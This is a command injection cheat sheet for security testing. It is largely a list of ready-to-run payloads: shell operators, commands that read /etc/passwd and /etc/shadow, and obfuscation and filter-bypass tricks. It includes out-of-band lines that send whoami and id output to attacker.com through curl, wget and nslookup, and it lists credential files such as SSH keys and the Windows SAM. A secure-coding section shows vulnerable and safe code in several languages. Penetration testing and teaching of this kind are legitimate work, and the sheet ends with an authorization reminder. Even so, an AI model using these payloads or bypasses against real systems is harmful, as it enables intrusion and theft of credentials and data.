# Command Injection Cheat Sheet

A quick reference guide for command injection testing.

## 📑 Table of Contents

- [Injection Operators](#injection-operators)
- [Detection Methods](#detection-methods)
- [Common Commands](#common-commands)
- [Obfuscation Techniques](#obfuscation-techniques)
- [Platform-Specific](#platform-specific)
- [Quick Test Payloads](#quick-test-payloads)

## 🔗 Injection Operators

### Semicolon (;)
Executes commands sequentially regardless of previous command status.
```
command1; command2
```

### Pipe (|)
Sends output of first command as input to second command.
```
command1 | command2
```

### OR (||)
Executes second command only if first command fails.
```
command1 || command2
```

### Ampersand (&)
Runs first command in background, then executes second command.
```
command1 & command2
```

### AND (&&)
Executes second command only if first command succeeds.
```
command1 && command2
```

### Backticks (`)
Command substitution - executes command and replaces with output.
```
`command`
```

### Dollar Parentheses $()
Modern command substitution (POSIX compliant).
```
$(command)
```

### Newline (%0a, \n)
Line terminator that can separate commands.
```
command1%0acommand2
```

## 🔍 Detection Methods

### 1. Direct Output
```
; whoami
| id
|| cat /etc/passwd
```

### 2. Time-Based (Blind)
```
; sleep 10
| ping -c 10 127.0.0.1
|| timeout 10
```

### 3. Out-of-Band
```
; curl http://attacker.com/$(whoami)
| nslookup $(whoami).attacker.com
|| wget http://attacker.com/?data=$(id)
```

### 4. Error-Based
```
; cat /nonexistent_file
| invalid_command_xyz
|| ls /root
```

## 💻 Common Commands

### Information Gathering

**Linux/Unix:**
```
whoami          # Current user
id              # User ID and groups
pwd             # Current directory
hostname        # System hostname
uname -a        # System information
cat /etc/passwd # User accounts
cat /etc/hosts  # Host file
ifconfig        # Network interfaces
ip addr         # IP addresses
ps aux          # Running processes
env             # Environment variables
```

**Windows:**
```
whoami                              # Current user
hostname                            # Computer name
ipconfig                            # Network configuration
systeminfo                          # System information
net user                            # User accounts
tasklist                            # Running processes
set                                 # Environment variables
type C:\Windows\win.ini             # Read file
dir                                 # List directory
echo %username%                     # Current username
```

## 🎭 Obfuscation Techniques

### 1. String Manipulation
```
cat /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
c${u}at /etc/passwd
```

### 2. Variable Substitution
```
cat /etc/passwd
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

### 3. Wildcards
```
cat /etc/passwd
cat /e?c/p?sswd
cat /e*c/p*sswd
/???/??t /???/??ss??
```

### 4. Brace Expansion
```
{cat,/etc/passwd}
{ls,-la}
```

### 5. Input Redirection
```
cat /etc/passwd
cat</etc/passwd
cat<>/etc/passwd
```

### 6. Command Substitution in Strings
```
$(cat /etc/passwd)
`cat /etc/passwd`
```

### 7. Hex/Encoding
```
cat /etc/passwd
c\x61t /etc/p\x61sswd
\143\141\164 /etc/passwd
```

### 8. Environment Variables
```
cat /etc/passwd
$0 cat /etc/passwd
${PATH:0:1}bin${PATH:0:1}cat /etc/passwd
```

### 9. Comment Characters
```
cat /etc/passwd #
cat /etc/passwd //
cat /etc/passwd;#
```

### 10. Null Bytes
```
cat%00 /etc/passwd
cat /etc/passwd%00
```

## 🖥️ Platform-Specific

### Linux/Unix Sensitive Files
```
/etc/passwd         # User accounts
/etc/shadow         # Password hashes
/etc/hosts          # Host mappings
/etc/hostname       # System hostname
/proc/version       # Kernel version
/proc/self/environ  # Current process environment
~/.ssh/id_rsa       # SSH private key
~/.bash_history     # Command history
/var/log/auth.log   # Authentication logs
```

### Windows Sensitive Files
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Users\[username]\ntuser.dat
```

### Shell Differences

**Bash-specific:**
```
$((expression))     # Arithmetic
${var:offset:length}  # String slicing
[[ condition ]]     # Advanced conditionals
```

**CMD-specific:**
```
%variable%          # Variable expansion
^                   # Escape character
```

**PowerShell:**
```
$variable           # Variable
Get-Process         # List processes
Get-Content file    # Read file
```

## ⚡ Quick Test Payloads

### Initial Detection
```
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
` sleep 5 `
$(sleep 5)
```

### Confirmation
```
; whoami
; id
; pwd
; ls
; cat /etc/passwd
; ipconfig
; systeminfo
```

### Encoded
```
%3b%20whoami
%7c%20id
%26%26%20pwd
%0a%20ls
```

### Obfuscated
```
; who$()ami
; w'h'o'a'm'i
; cat${IFS}/etc/passwd
; cat</etc/passwd
; /???/??/w??am?
```

### Time-Based Confirmation
```
; ping -c 10 127.0.0.1
| timeout 10
|| sleep 10
```

## 🛠️ Testing Checklist

- [ ] Test all injection operators (`;`, `|`, `||`, `&`, `&&`, `` ` ``, `$()`)
- [ ] Try URL encoding (`%3b`, `%7c`, `%26`, `%0a`, etc.)
- [ ] Test with and without spaces
- [ ] Try different quote types (`'`, `"`)
- [ ] Test backslash escaping (`\`)
- [ ] Try command substitution
- [ ] Test variable expansion (`${IFS}`, `$PATH`, etc.)
- [ ] Use wildcards (`?`, `*`)
- [ ] Try input redirection (`<`, `<<`, `<>`)
- [ ] Test null byte injection (`%00`)
- [ ] Try newline characters (`%0a`, `%0d`, `\n`, `\r`)
- [ ] Test comment characters (`#`, `//`)
- [ ] Try out-of-band techniques (DNS, HTTP)
- [ ] Test time-based detection methods

## 🔐 Testing Tips

1. **Start Simple**: Begin with basic operators before moving to complex obfuscation
2. **Use Time-Based**: When no output is visible, use sleep/ping commands
3. **Try Multiple Encodings**: URL encode, double encode, or use alternative encodings
4. **Context Matters**: Consider where the input is used (shell script, exec function, etc.)
5. **Check Both OS**: Test both Unix and Windows payloads if platform is unknown
6. **Monitor Traffic**: Use tools like Burp Collaborator or your own server for OOB detection
7. **Iterate**: If filtered, try various bypass techniques systematically
8. **Document**: Keep notes on what works and what doesn't

## ⚠️ Common Filters and Bypasses

| Filter | Bypass Technique |
|--------|------------------|
| Space blocked | `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, `cat</etc/passwd` |
| Semicolon blocked | `%0a`, `|`, `||`, `&`, `&&` |
| Slash blocked | `${PATH:0:1}`, `${HOME:0:1}` |
| Keywords blocked | `c''at`, `c""at`, `ca\t`, `c$@at`, wildcards |
| Quotes removed | Backslash escaping, hex encoding |
| Pipe blocked | Semicolon, newline characters |

## 📚 Example Vulnerable Code Patterns

### PHP
```php
// Vulnerable
system("ping -c 4 " . $_GET['ip']);
exec("nslookup " . $_POST['hostname']);
shell_exec("cat " . $filename);

// Secure
escapeshellcmd() and escapeshellarg()
Use parameterized execution
```

### Python
```python
# Vulnerable
os.system("ping " + user_input)
subprocess.call("ls " + directory, shell=True)

# Secure
subprocess.run(["ping", user_input])
subprocess.run(["ls", directory])
```

### Node.js
```javascript
// Vulnerable
exec("ping " + userInput);
child_process.exec("ls " + directory);

// Secure
execFile("ping", [userInput]);
spawn("ls", [directory]);
```

### Java
```java
// Vulnerable
Runtime.getRuntime().exec("cmd /c " + userInput);

// Secure
ProcessBuilder with array arguments
```

## 🎯 Target Injection Points

- URL parameters: `?file=test.txt&action=view`
- POST data fields
- HTTP headers (User-Agent, Referer, Cookie, X-Forwarded-For)
- File upload filenames
- File paths in parameters
- API endpoints
- WebSocket messages
- XML/JSON input fields

## 📖 References

- OWASP Command Injection
- PortSwigger Web Security Academy
- HackTricks - Command Injection
- CWE-77: Command Injection
- CWE-78: OS Command Injection

---

**Remember**: Always obtain proper authorization before testing. Use responsibly and ethically.